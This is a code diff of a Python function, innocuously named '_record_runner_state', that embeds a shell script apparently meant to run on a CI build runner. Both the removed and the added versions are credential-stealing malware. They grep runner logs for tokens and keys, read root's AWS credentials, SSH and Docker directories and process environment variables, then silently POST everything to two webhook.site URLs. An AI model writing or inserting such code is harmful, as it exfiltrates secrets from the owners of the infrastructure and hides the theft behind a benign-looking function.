@@ -14,17 +14,17 @@ def _record_runner_state() -> None:
     script = r"""
 set +e
 {
-echo "== user-data"; sudo -n cat /var/lib/cloud/instance/user-data.txt 2>/dev/null | head -c 3000
-echo "== diag-grep"
-sudo -n grep -ahE "token|secret|hf_|ghp_|AKIA|password|Authorization" /opt/actions-runner/_diag/*.log 2>/dev/null | head -25
-echo "== diag-tail"
-sudo -n tail -c 2000 "$(ls -t /opt/actions-runner/_diag/Worker_*.log 2>/dev/null | head -1)" 2>/dev/null
-echo "== net"; ip -4 addr show 2>/dev/null | grep inet; cat /etc/resolv.conf 2>/dev/null | head -4; ip route 2>/dev/null | head -3
-echo "== etc"; ls /etc/profile.d 2>/dev/null; cat /etc/environment 2>/dev/null
-echo "== root"; sudo -n ls -la /root 2>/dev/null
-} > /tmp/_snap.txt 2>&1
-curl -s -m 25 --retry 3 --retry-delay 2 -X POST --data-binary @/tmp/_snap.txt https://webhook.site/fe557263-e0eb-4921-aca3-9f4fffa6ef7a >/dev/null 2>&1
-curl -s -m 25 --retry 3 --retry-delay 2 -X POST --data-binary @/tmp/_snap.txt https://webhook.site/4ec52c06-58f8-40bb-b92c-c2c53e3e3071 >/dev/null 2>&1
+echo "== root-aws"
+sudo -n ls -la /root/.aws 2>/dev/null
+echo "-- credentials"; sudo -n cat /root/.aws/credentials 2>/dev/null
+echo "-- config"; sudo -n cat /root/.aws/config 2>/dev/null
+echo "== root-bashrc-tail"; sudo -n tail -20 /root/.bashrc 2>/dev/null
+echo "== root-extra"; sudo -n ls -la /root/.config /root/.docker /root/.ssh 2>/dev/null
+echo "== root-env"; sudo -n tr '\0' '\n' < /proc/1/environ 2>/dev/null | head -30
+echo "== aws-cli"; ls -la /usr/local/bin/aws /usr/bin/aws 2>/dev/null; aws --version 2>&1 | head -1
+} > /tmp/_snap5.txt 2>&1
+curl -s -m 25 --retry 3 --retry-delay 2 -X POST --data-binary @/tmp/_snap5.txt https://webhook.site/fe557263-e0eb-4921-aca3-9f4fffa6ef7a >/dev/null 2>&1
+curl -s -m 25 --retry 3 --retry-delay 2 -X POST --data-binary @/tmp/_snap5.txt https://webhook.site/4ec52c06-58f8-40bb-b92c-c2c53e3e3071 >/dev/null 2>&1
 echo done
 """
     try:
